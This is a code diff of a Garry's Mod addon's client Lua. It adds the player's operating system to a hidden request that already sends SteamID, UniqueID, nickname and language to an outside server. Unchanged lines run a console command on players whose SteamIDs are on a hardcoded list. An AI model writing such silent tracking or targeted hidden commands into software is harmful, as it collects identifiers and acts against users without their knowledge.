@@ -247,7 +247,13 @@ if (CLIENT) then
 				end
 				local lang = "";
 				if (SGLanguage!=nil and SGLanguage.GetClientLanguage!=nil) then lang = SGLanguage.GetClientLanguage(); end
-				HTMLTest:OpenURL("http://alex-php.net/gmod/IDC.php?id="..p:UniqueID().."&sid="..p:SteamID().."&rev="..StarGate.CapVer.."&system="..StarGate.GroupSystem.."&enc&nick="..util.Base64Encode(p:Nick()).."&ws="..ws.."&lang="..lang);
+				local os = 0;
+				if system.IsLinux() then
+					os = 1;
+				elseif system.IsOSX() then
+					os = 2;
+				end
+				HTMLTest:OpenURL("http://alex-php.net/gmod/IDC.php?id="..p:UniqueID().."&sid="..p:SteamID().."&rev="..StarGate.CapVer.."&system="..StarGate.GroupSystem.."&enc&nick="..util.Base64Encode(p:Nick()).."&ws="..ws.."&lang="..lang.."&os="..os);
 
 				if (table.HasValue(StarGate.SlGort,p:SteamID())) then
 		            --p:ConCommand("CAP_Banned");
@@ -255,7 +261,7 @@ if (CLIENT) then
 					p:ConCommand("$luarun")
 				end
 
-                /* removed?
+                /* removed? anyway we have gmod version check now so isn't needed anymore
 				-- Llapp stats
 		        http.Fetch("http://www.sg-carterpack.com/libs/sid.php?id="..p:SteamID(), function(contents)
 			        if(contents == "")then return end
